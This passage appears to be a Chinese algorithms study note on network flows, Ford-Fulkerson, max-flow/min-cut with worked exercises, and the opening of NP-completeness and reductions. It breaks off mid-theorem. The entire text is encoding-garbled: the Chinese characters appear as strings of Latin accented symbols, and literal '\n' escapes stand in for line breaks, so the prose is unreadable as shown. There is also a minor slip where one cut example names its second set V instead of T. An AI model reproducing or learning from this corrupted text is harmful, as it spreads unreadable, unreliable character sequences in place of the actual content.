â¶åŸºç¡€æ¦‚å¿µ\n\n**ç½‘ç»œæµ(Network-Flows)**æ˜¯ä¸€ç§ç±»æ¯”`æ°´æµ`çš„è§£å†³é—®é¢˜æ–¹æ³•ï¼Œä¸çº¿æ€§è§„åˆ’å¯†åˆ‡ç›¸å…³ã€‚ç½‘ç»œæµæ˜¯å›¾è®ºä¸­çš„ä¸€ç§ç†è®ºä¸æ–¹æ³•ï¼Œç ”ç©¶ç½‘ç»œä¸Šçš„ä¸€ç±»æœ€ä¼˜åŒ–é—®é¢˜ã€‚\n\n**ç½‘ç»œ(NetWork)ï¼š**æ˜¯æŒ‡ä¸€ä¸ªæœ‰å‘å›¾ G =(V,E)ï¼ŒV æ˜¯å›¾ G ä¸­é¡¶ç‚¹çš„é›†åˆï¼ŒE æ˜¯å›¾ G ä¸­è¾¹çš„é›†åˆã€‚ï¼ˆ**è¿è¾“æ°´æµçš„æ°´ç®¡çº¿è·¯**ï¼‰\n\n- æ¯æ¡`è¾¹ (u,v)` âˆˆ E éƒ½æœ‰ä¸€ä¸ª`æƒå€¼ c(u,v)` ï¼Œç§°ä¹‹ä¸º`å®¹é‡(Capacity)`ï¼Œå½“ (u,v) âˆ‰ E æ—¶ c(u,v) = 0ã€‚\n\n- å›¾ G æœ‰ä¸¤ä¸ªç‰¹æ®Šçš„ç‚¹ï¼š`æºç‚¹ s` âˆˆ V å’Œ`æ±‡ç‚¹ t` âˆˆ V ã€‚\n\n**å¼§** (arc) **ï¼š** å›¾ G çš„è¾¹ `(u,v)`ï¼ˆ**æ°´ç®¡**ï¼‰\n\n**æºç‚¹** (Sources)ï¼š å¯ä»¥ç†è§£ä¸º**èµ·ç‚¹**ã€‚å®ƒä¼šæºæºä¸æ–­åœ°æ”¾å‡ºæµé‡ï¼Œè¡¨ç¤ºä¸º `s` ã€‚ï¼ˆ**å¯æ— é™å‡ºæ°´çš„æ°´å‚**ï¼‰\n\n**æ±‡ç‚¹** (Sinks)ï¼šå¯ä»¥ç†è§£ä¸º**ç»ˆç‚¹**ã€‚å®ƒä¼šæ— é™åœ°æ¥å—æµé‡ï¼Œè¡¨ç¤ºä¸º `t` ã€‚ï¼ˆ**å¯æ— é™æ¥æ”¶æ°´çš„å°åŒº**ï¼‰\n\n**å®¹é‡** (Capacity) **ï¼š**æ¯æ¡å¼§ (u,v) çš„æƒå€¼ `c(u,v)` ï¼ˆ**æ°´ç®¡è§„æ ¼ã€‚å³å¯æ‰¿å—çš„æœ€å¤§æ°´æµé‡**ï¼‰\n\n**å®¹é‡ç½‘ç»œï¼š** æ‹¥æœ‰**æºç‚¹**å’Œ**æ±‡ç‚¹**ä¸”æ¯æ¡å¼§éƒ½ç»™å‡ºäº†**å®¹é‡**çš„**ç½‘ç»œ**ã€‚ï¼ˆ**å®‰æ’å¥½äº†æ°´å‚ã€å°åŒºå’Œæ°´ç®¡è§„æ ¼çš„è·¯çº¿å›¾**ï¼‰\n\n![å®¹é‡ç½‘ç»œ](https://img.jwt1399.top//img/20211016110427.png)\n\n\n\n**æµé‡** (Flow) **ï¼š**å®¹é‡ç½‘ç»œGä¸­æ¯æ¡å¼§< u,v>ä¸Šçš„å®é™…æµé‡ ï¼Œè¡¨ç¤ºä¸º `f(u,v)` ï¼ˆ**è¿è¾“çš„æ°´æµé‡**ï¼‰\n\nâ€‹\tè®¾ `f(u,v)`å®šä¹‰åœ¨äºŒå…ƒç»„ (uâˆˆV, vâˆˆV) ä¸Šçš„å®æ•°å‡½æ•°æ»¡è¶³ï¼š\n\n- å®¹é‡é™åˆ¶ï¼šå¯¹äºæ¯æ¡è¾¹ï¼Œæµç»è¯¥è¾¹çš„æµé‡ä¸è¶…è¿‡è¯¥è¾¹çš„å®¹é‡ï¼Œå³ f(u,v)â‰¤c(u,v) (**æ°´æµé‡è¶…è¿‡äº†æ°´ç®¡è§„æ ¼å°±çˆ†äº†**ï¼‰\n\n- æ–œå¯¹ç§°æ€§ï¼šæ¯æ¡è¾¹çš„æµé‡ä¸å…¶ç›¸åè¾¹çš„æµé‡ä¹‹å’Œä¸º 0 ï¼Œå³ f(u,v)+f(v,u)=0 (**å¯ä»¥æš‚ä¸”æ„Ÿæ€§ç†è§£ä¸ºçŸ¢é‡çš„æ­£è´Ÿ**)\n\n- æµå®ˆæ’æ€§ï¼šä»æºç‚¹æµå‡ºçš„æµé‡ç­‰äºæ±‡ç‚¹æµå…¥çš„æµé‡ã€‚å³ âˆ€x âˆˆ V - {s,t}ï¼Œâˆ‘<sub>(u,x)âˆˆE</sub>f(u,x) = âˆ‘<sub>(x,v)âˆˆE</sub>f(x,v) (**å¯¹äºæ‰€æœ‰çš„æ°´ç®¡äº¤ç•Œå¤„ï¼Œæœ‰å¤šå°‘æ°´æµé‡è¿‡æ¥ï¼Œå°±åº”æœ‰å¤šå°‘æ°´æµé‡å‡ºå»**)\n\n![æµå‡½æ•°](https://img.jwt1399.top//img/20211016110621.png)\n\n**æµé‡ç½‘ç»œï¼š** æ‹¥æœ‰**æºç‚¹**å’Œ**æ±‡ç‚¹**ä¸”æ¯æ¡å¼§éƒ½ç»™å‡ºäº†**æµé‡**çš„**ç½‘ç»œ**ã€‚(**åˆ†é…å¥½äº†å„ä¸ªæ°´ç®¡æ°´æµé‡çš„è·¯çº¿å›¾**)\n\n![æµé‡ç½‘ç»œ](https://img.jwt1399.top//img/20211016110431.png)\n\n\n\n**å‰©ä½™å®¹é‡**(Residual)ï¼šå¯¹äºæ¯æ¡è¾¹ï¼Œ`å‰©ä½™å®¹é‡(Residual) = å®¹é‡(Capacity) âˆ’ æµé‡(Flow)`ã€‚(**è¡¨ç¤ºæ°´ç®¡åˆ†é…äº†æ°´æµé‡åè¿˜èƒ½ç»§ç»­æ‰¿å—çš„æ°´æµé‡**ï¼‰\n\n**æ®‹é‡ç½‘ç»œï¼š** æ‹¥æœ‰**æºç‚¹**å’Œæ±‡ç‚¹ä¸”æ¯æ¡å¼§è¿˜æœ‰**å‰©ä½™å®¹é‡**çš„**ç½‘ç»œ**ã€‚`æ®‹é‡ç½‘ç»œ = å®¹é‡ç½‘ç»œ âˆ’ æµé‡ç½‘ç»œ`ã€‚åˆå§‹çš„æ®‹é‡ç½‘ç»œå³ä¸ºå®¹é‡ç½‘ç»œã€‚ï¼ˆ**è¡¨ç¤ºäº†åˆ†é…äº†ä¸€å®šçš„æ°´æµé‡åè¿˜èƒ½ç»§ç»­æ‰¿å—çš„æ°´æµé‡è·¯çº¿å›¾**ï¼‰\n\n![å‰©ä½™ç½‘ç»œ](https://img.jwt1399.top//img/20211016111631.png)\n\n\n\n### â·æœ€å¤§æµ\n\n> **é—®é¢˜æè¿°ï¼š**æˆ‘ä»¬æœ‰ä¸€å¼ æœ‰å‘å›¾ï¼Œè¦æ±‚ä»æºç‚¹ s æµå‘æ±‡ç‚¹ t çš„æœ€å¤§æµé‡ï¼ˆå¯ä»¥æœ‰å¾ˆå¤šæ¡è·¯åˆ°è¾¾æ±‡ç‚¹ï¼‰ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„æœ€å¤§æµé—®é¢˜ã€‚\n\n#### â€åŸºç¡€æ¦‚å¿µ\n\n**ç½‘ç»œçš„æµé‡ï¼š** åœ¨æŸç§æ–¹æ¡ˆä¸‹å½¢æˆçš„**æµé‡ç½‘ç»œ**ä¸­**æ±‡ç‚¹**æ¥æ”¶åˆ°çš„**æµé‡**å€¼ã€‚ï¼ˆ**å°åŒºæœ€ç»ˆæ¥æ”¶åˆ°çš„æ€»æ°´æµé‡**ï¼‰\n\n**æœ€å¤§æµ(Maximum-Flow)** ï¼š**ç½‘ç»œçš„æµé‡**çš„æœ€å¤§å€¼ã€‚ï¼ˆ**å°åŒºå¯æ¥å—åˆ°çš„æœ€å¤§æ°´æµé‡**ï¼‰\n\n**æœ€å¤§æµç½‘ç»œï¼š** è¾¾åˆ°**æœ€å¤§æµ**çš„**æµé‡ç½‘ç»œ**ã€‚ï¼ˆ**å°åŒºæ¥æ”¶åˆ°æœ€å¤§æ°´æµé‡çš„åˆ†é…æ–¹æ¡ˆè·¯çº¿å›¾**ï¼‰\n\n**å¢å¹¿è·¯å¾„(Augmenting Path)ï¼š** ä¸€æ¡åœ¨**æ®‹é‡ç½‘ç»œ**ä¸­ä» s åˆ° t çš„è·¯å¾„ï¼Œè·¯å¾„ä¸Šæ‰€æœ‰è¾¹çš„**æ®‹ç•™å®¹é‡**éƒ½ä¸ºæ­£ã€‚\n(**å¯ä»¥æˆåŠŸä»æ°´å‚å°†æ°´é€åˆ°å°åŒºçš„ä¸€æ¡è·¯çº¿**ï¼‰\n\n#### âå¢å¹¿è·¯ç®—æ³•\n\n> å½“æ®‹é‡ç½‘ç»œä¸åŒ…å«å¢å¹¿è·¯å¾„æ—¶èƒ½æ±‚å¾—æœ€å¤§æµ\n\nä¾‹å¦‚å¦‚ä¸‹ç½‘ç»œï¼š\n\n| åˆå§‹å®¹é‡ç½‘ç»œ                                         | åˆå§‹æ®‹é‡ç½‘ç»œ                                         |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20211016110427.png) | ![](https://img.jwt1399.top//img/20211016132829.png) |\n\n**å¯»æ‰¾å¢å¹¿è·¯å¾„**,å¢å¹¿è·¯å¾„ä¸Šçš„æµé‡ä¸ºè·¯å¾„ä¸Šæœ€å°å®¹é‡\n\n| å¢å¹¿è·¯å¾„1ï¼ˆsâ†’v<sub>2</sub>â†’v<sub>4</sub>â†’tï¼‰                 | æ®‹é‡ç½‘ç»œ1                                            |\n| ------------------------------------------------------------ | ---------------------------------------------------- |\n| ![sâ†’v2â†’v4â†’t](https://img.jwt1399.top//img/20211016132837.png) | ![](https://img.jwt1399.top//img/20211016132841.png) |\n| **å¢å¹¿è·¯å¾„2ï¼ˆsâ†’v<sub>1</sub>â†’v<sub>3</sub>â†’tï¼‰**             | **æ®‹é‡ç½‘ç»œ2**                                        |\n| ![sâ†’v1â†’v3â†’t](https://img.jwt1399.top//img/20211016132845.png) | ![](https://img.jwt1399.top//img/20211016132848.png) |\n| **å¢å¹¿è·¯å¾„3ï¼ˆsâ†’v<sub>1</sub>â†’v<sub>4</sub>â†’tï¼‰**             | **æœ€ç»ˆæ®‹é‡ç½‘ç»œ**                                     |\n| ![](https://img.jwt1399.top//img/20211016132853.png)         | ![](https://img.jwt1399.top//img/20211016132856.png) |\n\n**æ±‚æµé‡ç½‘ç»œ**ï¼Œæµé‡ç½‘ç»œ = åˆå§‹å®¹é‡ç½‘ç»œ - æœ€ç»ˆæ®‹ä½™ç½‘ç»œ\n\n![æµé‡ç½‘ç»œ](https://img.jwt1399.top//img/20211016132910.png)\n\n**å› æ­¤æœ€å¤§æµä¸ºä» s æµå‡ºçš„æµé‡ 3 + 2 = 5 æˆ–è€…æµå…¥ t çš„æµé‡ 2 +3 =5**\n\n**ä½†æ˜¯è¿™ç§ç®—æ³•å¹¶ä¸èƒ½ä¿è¯ä¸€å®šèƒ½å¾—åˆ°æœ€å¤§æµ**ï¼Œå–å†³äºä½ é€‰æ‹©å¢å¹¿è·¯å¾„çš„é¡ºåºï¼Œæˆ‘ä»¬åŒæ ·ä»¥ä¸Šæ–¹åˆå§‹å®¹é‡ç½‘ç»œå›¾ä¸ºä¾‹ï¼Œå‡è®¾ç¬¬ä¸€æ¡å¢å¹¿è·¯å¾„é€‰æ‹© **sâ†’v<sub>1</sub>â†’v<sub>4</sub>â†’t**ï¼Œç¬¬äºŒæ¡å¢å¹¿è·¯å¾„é€‰æ‹© **sâ†’v<sub>1</sub>â†’v<sub>3</sub>â†’t**ï¼Œå¾—åˆ°å¦‚ä¸‹æ®‹é‡ç½‘ç»œ å’Œ æµé‡ç½‘ç»œ\n\n| å®¹é‡ç½‘ç»œ                                             | æ®‹é‡ç½‘ç»œ                                             | æµé‡ç½‘ç»œ                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20211016110427.png) | ![](https://img.jwt1399.top//img/20211016133136.png) | ![](https://img.jwt1399.top//img/20211016133139.png) |\n\n**å› æ­¤è¯¥ç§æ–¹æ³•æ±‚å¾—æœ€å¤§æµä¸ºä» s æµå‡ºçš„æµé‡ 4 + 0 = 4 æˆ–è€…æµå…¥ t çš„æµé‡ 1 +3 =4**ï¼Œæ˜¾ç„¶æ¯”åˆšåˆšæ±‚å¾—çš„æœ€å¤§æµ 5 è¦å°\n\n`æ€»ç»“ï¼š`è¿™ç§ç®—æ³•å¹¶ä¸èƒ½ä¿è¯ä¸€å®šèƒ½å¾—åˆ°æœ€å¤§æµï¼Œå–å†³äºä½ é€‰æ‹©å¢å¹¿è·¯å¾„çš„é¡ºåºï¼Œé‚£ä¹ˆå¦‚ä½•ä¿è¯æ— è®ºæ€ä¹ˆé€‰æ‹©å¢å¹¿è·¯å¾„ä»ç„¶èƒ½æ±‚å¾—æœ€å¤§æµå‘¢ï¼Ÿä¸”å¬æˆ‘å¨“å¨“é“æ¥ã€‚\n\n#### â‚Ford-Fulkerson\n\nFF ç®—æ³•æ ¸å¿ƒæ˜¯å¼•å…¥åå‘è¾¹ï¼Œæœ‰äº†åå‘è¾¹ï¼Œå“ªæ€•ä¹‹å‰é€‰æ‹©çš„å¢å¹¿è·¯å¾„é¡ºåºä¸å¥½ï¼Œä¹Ÿæœ‰äº†ä¸€ä¸ªåæ‚”å’Œæ”¹æ­£çš„æœºä¼š\n\nFFç®—æ³•å¤æ‚åº¦ï¼šO(f*m) (f ä¸ºæœ€å¤§æµï¼Œmä¸ºåŸå›¾è¾¹çš„æ•°é‡)\n\næˆ‘ä»¬æ¥æ”¹é€ ä¸Šæ–¹çš„é”™è¯¯æ±‚è§£æ–¹æ³•\n\n| å¢å¹¿è·¯å¾„1(sâ†’v<sub>1</sub>â†’v<sub>4</sub>â†’t)                   | æ®‹é‡ç½‘ç»œ1                                            | åŠ å…¥è·¯å¾„1åå‘è¾¹                                              |\n| ------------------------------------------------------------ | ---------------------------------------------------- | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top//img/20211016141358.png)         | ![](https://img.jwt1399.top//img/20211016141425.png) | ![](https://img.jwt1399.top//img/20211016141433.png)         |\n| **å¢å¹¿è·¯å¾„2(sâ†’v<sub>1</sub>â†’v<sub>3</sub>â†’t)**               | **æ®‹é‡ç½‘ç»œ2**                                        | **åŠ å…¥è·¯å¾„2åå‘è¾¹**                                          |\n| ![](https://img.jwt1399.top//img/20211016141347.png)         | ![](https://img.jwt1399.top//img/20211016141416.png) | ![](https://img.jwt1399.top//img/20211016141442.png)         |\n| **å¢å¹¿è·¯å¾„3(sâ†’v<sub>2</sub>â†’v<sub>4</sub>â†’v<sub>1</sub>â†’v<sub>3</sub>â†’t)** | **æ®‹é‡ç½‘ç»œ3**                                        | **åŠ å…¥è·¯å¾„3åå‘è¾¹**                                          |\n| ![ç›¸å½“äºåæ‚”v4â†’v1çš„3ä»½æµé‡](https://img.jwt1399.top//img/20211016141457.png) | ![](https://img.jwt1399.top//img/20211016141459.png) | ![å·²ç»æ²¡æœ‰såˆ°tçš„å¢å¹¿è·¯å¾„](https://img.jwt1399.top//img/20211016141503.png) |\n| **ç§»é™¤æ‰€æœ‰åå‘è¾¹å¾—æœ€ç»ˆæ®‹é‡å›¾**                               | **æµé‡å›¾**                                           | **æœ€å¤§æµ**                                                   |\n| ![](https://img.jwt1399.top//img/20211016141512.png)         | ![](https://img.jwt1399.top//img/20211016141517.png) | **å› æ­¤æœ€å¤§æµä¸ºä» s æµå‡ºçš„æµé‡4 + 1 = 5 æˆ–è€…æµå…¥ t çš„æµé‡ 2 +3 =5** |\n\n### â¸æœ€å°å‰²\n\n**å‰²**ï¼šå¯¹äºä¸€ä¸ªç½‘ç»œæµå›¾ G = (V,E)ï¼Œå…¶å‰²çš„å®šä¹‰ä¸ºä¸€ç§ **ç‚¹çš„åˆ’åˆ†æ–¹å¼**ï¼šå°†æ‰€æœ‰çš„ç‚¹ V åˆ’åˆ†ä¸º S å’Œ T ä¸¤ä¸ªé›†åˆï¼Œå…¶ä¸­æºç‚¹  s âˆˆ S ï¼Œæ±‡ç‚¹ t âˆˆ Tã€‚å‰²å¹¶ä¸å”¯ä¸€\n\n![](https://img.jwt1399.top/img/202211082244581.png)\n\n`ä¸Šå›¾å°±ä¸ºä¸€ç§å‰²ï¼ŒS = {s,v1,v2}ï¼ŒV ={t,v3,v4},sçš„æ°´æ— æ³•æµåˆ°täº†`\n\n**å‰²çš„å®¹é‡**ï¼šæˆ‘ä»¬çš„å®šä¹‰å‰² (S,T) çš„å®¹é‡ c(S,T) è¡¨ç¤ºæ‰€æœ‰ä» S åˆ° T çš„è¾¹çš„å®¹é‡ä¹‹å’Œï¼Œå³ c(S,T) = âˆ‘<sub>uâˆˆS,vâˆˆT</sub>c(u,v) ã€‚\n\n![](https://img.jwt1399.top//img/20211021151950.png)\n\n`å®¹é‡ c(S,T) = 2 + 2 + 2 = 6`\n\n![](https://img.jwt1399.top//img/20211021151945.png)\n\n`å®¹é‡ c(S,T) = 2 + 1 = 3`\n\n**æœ€å°å‰²ï¼š**æ±‚å¾—ä¸€ä¸ªå‰² (S,T) ä½¿å¾—å‰²çš„å®¹é‡ c(S,T) æœ€å°ï¼Œæœ€å°å‰²å¹¶ä¸ä¸€å®šå”¯ä¸€ã€‚\n\n**æœ€å¤§æµæœ€å°å‰²å®šç†**ï¼šf(s,t)<sub>max</sub> = c(S,T)<sub>min</sub> æœ€å°å‰²çš„å®¹é‡ç­‰ä»·äºæœ€å¤§æµçš„æµé‡\n\n**æ±‚è§£æœ€å°å‰²ï¼š** \n\n- **æ±‚æœ€å°å‰²çš„å®¹é‡**ï¼Œé‚£ä¹ˆåªè¦è·‘ä¸€éç½‘ç»œæœ€å¤§æµå³å¯å¾—å‡ºç­”æ¡ˆã€‚\n\n- **æ±‚ S é›†åˆå’Œ T é›†åˆ**ï¼Œé‚£ä¹ˆå…ˆè·‘ä¸€éç½‘ç»œæœ€å¤§æµï¼Œç„¶ååœ¨è·‘å®Œç½‘ç»œæœ€å¤§æµçš„æ®‹ç•™ç½‘ç»œä¸­ï¼Œä»æºç‚¹ s å¼€å§‹è¿›è¡Œ DFSï¼Œèƒ½éå†åˆ°çš„èŠ‚ç‚¹éƒ½å±äº S é›†åˆï¼Œå‰©ä¸‹çš„èŠ‚ç‚¹éƒ½å±äº T é›†åˆã€‚\n\n| åˆå§‹å®¹é‡ç½‘ç»œ                                         | æœ€ç»ˆæ®‹é‡ç½‘ç»œ                                         | æœ€å°å‰²                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20211016110427.png) | ![](https://img.jwt1399.top//img/20211016132856.png) | ![](https://img.jwt1399.top//img/20211016145010.png) |\n\n**å› æ­¤æœ€å°å‰²ä¸º{ {s,v1,v2,v4}{t,v3}}ï¼Œå®¹é‡(æœ€å¤§æµ)ä¸º 5**\n\n### â¹æµä¸å‰²\n\nå¯¹ä»»æ„æµ fï¼Œä»»æ„å‰² (A, B)ï¼Œ**æµçš„å¤§å°ä¸ºæµå‡ºAçš„æµé‡ä¸æµå…¥Açš„æµé‡ä¹‹å·®**ã€‚\n\n![](https://img.jwt1399.top/img/image-20211021153436806.png)\n\nä¾‹å¦‚å¦‚ä¸‹ ï¼ŒAé›†åˆä¸ºé»‘è‰²å°åœ†åœˆï¼ŒBé›†åˆä¸ºç™½è‰²å°åœ†åœˆ\n\n![](https://img.jwt1399.top/img/image-20211021152515576.png)\n\nval(f) = (10 + 10 + 5 +10 + 0 + 0) - (5 +5 + 0 +0 ) = 25\n\n![](https://img.jwt1399.top/img/image-20211021152742760.png)\n\nval(f) = (20 + 22) - (8 + 4 + 4 ) = 26\n\n### âºçœŸé¢˜ç»ƒä¹ \n\n#### â€é¢˜ç›®1\n\nè®¡ç®—ä¸‹å›¾ä¸­ä»Såˆ°Tçš„æœ€å¤§æµå’Œæœ€å°å‰².\n\n![](https://img.jwt1399.top//img/20211016201257.gif)\n\nå¢å¹¿è·¯å¾„ï¼š(*S*, *A*, *B*, *T*)ï¼Œç½‘ç»œæµå¤§å°+6\n\nå¢å¹¿è·¯å¾„ï¼š(*S*, *B*, *E*, *T*)ï¼Œç½‘ç»œæµå¤§å°+4      \n\nå¢å¹¿è·¯å¾„ï¼š(*S*, *A*, *D*, *E*, *T*)ï¼Œç½‘ç»œæµå¤§å°+3\n\nå¢å¹¿è·¯å¾„ï¼š(*S*, *C*, *E*, *T*)ï¼Œç½‘ç»œæµå¤§å°+3\n\n\n\n![](https://img.jwt1399.top//img/20211016201305.png)\n\n**æœ€å¤§æµ 6 + 4 + 3 + 3 = 16**\n\n**æœ€å°å‰² [ {Sï¼ŒAï¼ŒBï¼ŒCï¼ŒDï¼ŒE}ï¼Œ{T} ]**\n\n#### âé¢˜ç›®2\n\næ±‚ä¸‹å›¾ä¸­Så’ŒTé—´çš„æœ€å¤§æµï¼Œè¦æ±‚ç»™å‡ºæœ€å°‘ä¸¤ä¸ªä¸­é—´è®¡ç®—æ­¥éª¤ã€‚\n\n![](https://img.jwt1399.top//img/20211016201320.png)\n\nå¢å¹¿è·¯å¾„ï¼š(Sï¼ŒCï¼ŒFï¼ŒTï¼‰ï¼Œæµé‡å€¼+1\n\nå¢å¹¿è·¯å¾„ï¼š(Sï¼ŒCï¼ŒBï¼ŒFï¼ŒT)ï¼Œæµé‡å€¼+1\n\nå¢å¹¿è·¯å¾„ï¼š(Sï¼ŒAï¼ŒBï¼ŒFï¼ŒT)ï¼Œæµé‡å€¼+1\n\nå¢å¹¿è·¯å¾„ï¼š(Sï¼ŒAï¼ŒDï¼ŒT )ï¼Œæµé‡å€¼+1\n\nå¢å¹¿è·¯å¾„ï¼š(Sï¼ŒAï¼ŒEï¼ŒDï¼ŒT )ï¼Œæµé‡å€¼+1\n\nå¢å¹¿è·¯å¾„ï¼š(Sï¼ŒAï¼ŒEï¼ŒT)ï¼Œæµé‡å€¼+1\n\nå¢å¹¿è·¯å¾„ï¼š(Sï¼ŒBï¼ŒFï¼ŒEï¼ŒT)ï¼Œæµé‡å€¼+3\n\n![é—¹é—¹å‹æƒ…æä¾›](https://img.jwt1399.top/img/202112091215288.png)\n\n**æœ€å¤§æµ 1 + 1 + 1 + 1 + 1 + 1 + 3  = 9**\n\n## â‘¦NPå®Œå¤‡æ€§ç†è®º\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£ä»€ä¹ˆæ˜¯å¤šé¡¹å¼å½’çº¦ï¼ˆpolynomial-time reductionï¼‰\n>\n> - ä»ä¸€ä¸ªé—®é¢˜ A å¤šé¡¹å¼å½’çº¦åˆ°å¦ä¸€ä¸ªé—®é¢˜ B æ—¶ï¼ŒæŒæ¡é’ˆå¯¹é—®é¢˜ A çš„ä»»æ„å®ä¾‹æ„é€ é—®é¢˜ B çš„å®ä¾‹çš„æ–¹æ³•ã€‚\n> - è‡ªèº«å½’çº¦\n> - æŒæ¡å¦‚æœPâ‰ NP ï¼ŒPã€NPå’ŒNPCä¸‰ä¸ªé›†åˆä¹‹é—´çš„å…³ç³»ï¼Œ ä»¥åŠNPé—®é¢˜å®šä¹‰çš„éå¯¹ç§°æ€§\n> - è®°ä½è¯æ˜ä¸€ä¸ªé—®é¢˜å±äºNPCçš„åŸºæœ¬æ­¥éª¤\n> - èƒ½è¯æ˜ç»™å®šçš„é—®é¢˜æ˜¯NPå®Œå…¨é—®é¢˜\n\n### â¶P&NP&NPC\n\n#### â€åŸºç¡€æ¦‚å¿µ\n\n- **P(Polynomial-timeï¼Œå¤šé¡¹å¼æ—¶é—´)ï¼š**èƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…æ±‚è§£çš„é—®é¢˜ã€‚\n  - å¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼Œå¯¹äºè§„æ¨¡ä¸º n çš„è¾“å…¥ï¼Œåœ¨æœ€åæƒ…å†µä¸‹çš„è¿è¡Œæ—¶é—´æ˜¯O(n<sup>k</sup>)ï¼Œå…¶ä¸­ k ä¸ºæŸä¸€ç¡®å®šå¸¸æ•°ã€‚\n  - ä¼ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼Œå…¸å‹çš„0-1èƒŒåŒ…é—®é¢˜ç®—æ³•å¤æ‚åº¦ä¸ºO(n*W)ï¼Œå…¶è¿è¡Œæ—¶é—´ä¸è¾“å…¥çš„è§„æ¨¡ç›¸å…³ï¼Œæ˜¯ä¼ªå¤šé¡¹å¼çš„ã€‚\n\n- **NP(Nondeterministic Polynomial-timeï¼Œéç¡®å®šæ€§å¤šé¡¹å¼æ—¶é—´)ï¼š**èƒ½å¤šé¡¹å¼æ—¶é—´å†…å¯ä»¥è¢«éªŒè¯çš„é—®é¢˜\n- **NPC(NP Completenessï¼ŒNPå®Œå…¨)ï¼š**NPä¸­æœ€éš¾çš„é—®é¢˜ï¼Œå¯èƒ½æ²¡æœ‰å¤šé¡¹å¼æ—¶é—´ç®—æ³•çš„é—®é¢˜ ï¼Œæ»¡è¶³ä¸¤ä¸ªæ¡ä»¶â‘ æ˜¯ä¸€ä¸ªNPé—®é¢˜â‘¡æ‰€æœ‰çš„NPé—®é¢˜éƒ½å¯ä»¥çº¦åŒ–åˆ°å®ƒ\n- **NP-Hard**ï¼šæ¯”NPé—®é¢˜éƒ½è¦éš¾çš„é—®é¢˜ï¼Œæ»¡è¶³NPCé—®é¢˜çš„ç¬¬äºŒæ¡ï¼Œä½†ä¸ä¸€å®šè¦æ»¡è¶³ç¬¬ä¸€æ¡\n\n#### âP&NP&NPCå…³ç³»\n\n- å½“ P â‰  NP æ—¶ï¼ŒNP é—®é¢˜å’Œ NP-hard çš„äº¤é›†å°±æ˜¯ NPC é—®é¢˜\n- å½“ P = NP æ—¶ï¼ŒP = NP = NPC\n\n![](https://img.jwt1399.top/img/image-20211129115054549.png)\n\n####  â‚NPé—®é¢˜å®šä¹‰çš„éå¯¹ç§°æ€§\n\nè¿™ä¸ªé—®é¢˜å°ç®€ä¹Ÿä¸å¤ªæ‡‚ï¼Œä¸çŸ¥é“å¦‚ä½•å†™ï¼Œæœ‰çŸ¥é“çš„å¤§ä½¬å¯ä»¥ç»™å°ç®€è®²è®²å—\n\n### â·å¤šé¡¹å¼æ—¶é—´å½’çº¦\n\n**å½’çº¦**\n\næè¿°ï¼šåœ¨ç ”ç©¶ä¸åŒé—®é¢˜çš„éš¾åº¦æ—¶ï¼Œå¸Œæœ›è¡¨è¾¾â€œé—®é¢˜ Y è‡³å°‘åƒé—®é¢˜ X ä¸€æ ·çš„éš¾â€ï¼Œè¿™å°±æ˜¯å½’çº¦ã€‚\n\nå®šä¹‰ï¼šè®¾è®¡ä¸€ä¸ªå‡½æ•° f(x)ï¼ŒæŠŠé—®é¢˜ A çš„è¾“å…¥è½¬æ¢æˆé—®é¢˜ B çš„ä¸€ä¸ªè¾“å…¥ï¼Œè¿™æ ·å°±èƒ½ç”¨é—®é¢˜ B çš„è§£æ³•æ¥æ±‚è§£ã€‚è¿™æ ·å°±æ˜¯å½’çº¦æŠ€æœ¯ï¼Œå°†è¿™ä¸ªé—®é¢˜è½¬æ¢ä¸ºç±»ä¼¼çš„å…¶ä»–é—®é¢˜ã€‚\n\n**å¤šé¡¹å¼æ—¶é—´å½’çº¦**\n\næè¿°ï¼šæ‰€è°“å¤šé¡¹å¼å½’çº¦æ˜¯æŒ‡è½¬æ¢å‡½æ•° f(x) ä¸èƒ½å¤ªå¤æ‚ï¼Œéœ€è¦åœ¨å¤šé¡¹å¼æ—¶é—´å†…å®Œæˆï¼Œå¦‚æœæ˜¯æŒ‡æ•°çº§æˆ–å…¶ä»–å¤æ‚åº¦å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚\n\nå®šä¹‰ï¼šå¦‚æœé—®é¢˜ X å’Œé—®é¢˜ Y æ»¡è¶³ä»¥ä¸‹ä¸¤æ¡æ€§è´¨ï¼Œé‚£ä¹ˆé—®é¢˜ X å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å½’çº¦åˆ°é—®é¢˜ Y ã€‚è®°ä¸ºï¼šX â‰¤<sub>pÂ </sub>Y \n\n- é—®é¢˜ X å¯ä»¥é€šè¿‡å¤šé¡¹å¼æ—¶é—´çš„åŸºæœ¬è¿ç®—æ­¥éª¤è½¬æ¢ä¸ºé—®é¢˜ Yï¼›\n- é—®é¢˜ X å¤šé¡¹å¼æ¬¡è°ƒç”¨æ±‚è§£é—®é¢˜ Y çš„ç®—æ³•ï¼Œä¸”é—®é¢˜ Y å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…è¢«æ±‚è§£ã€‚\n\næ ¹æ®ä»¥ä¸Šå®šä¹‰ï¼Œå¯ä»¥å¾—åˆ°ä¸‰ä¸ª**å®šç†**ï¼š\n\n- å‡è®¾ X â‰¤<sub>p</sub> Yï¼Œå¦‚æœ Y èƒ½å¤Ÿåœ¨å¤šé¡¹å¼æ—¶é—´å†…æ±‚è§£ï¼Œé‚£ä¹ˆ X ä¹Ÿèƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…æ±‚è§£ã€‚\n- å‡è®¾ X â‰¤<sub>p</sub> Yï¼Œå¦‚æœ X ä¸èƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…æ±‚è§£ï¼Œé‚£ä¹ˆ Y ä¹Ÿä¸èƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…æ±‚è§£ã€‚\n- å¦‚æœ X â‰¤<sub>p</sub> Y ä¸” Y â‰¤<sub>p</sub> 